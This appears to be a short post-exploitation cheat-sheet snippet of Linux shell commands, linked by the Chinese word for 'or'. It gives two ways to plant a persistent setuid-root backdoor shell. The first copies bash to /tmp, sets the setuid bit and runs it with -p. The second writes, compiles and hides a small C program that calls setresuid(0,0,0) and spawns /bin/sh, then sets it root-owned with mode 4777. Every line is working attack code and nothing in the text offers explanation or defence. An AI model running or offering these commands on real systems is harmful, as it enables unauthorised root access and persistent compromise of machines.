	>cp /bin/bash /tmp/tmp
	>chmod u+s /tmp/tmp
	>/tmp/tmp -p
	或者
	>TMPDIR2="/var/tmp"
	>echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
	>gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
	>rm $TMPDIR2/croissant.c
	>chown root:root $TMPDIR2/croissant
	>chmod 4777 $TMPDIR2/croissant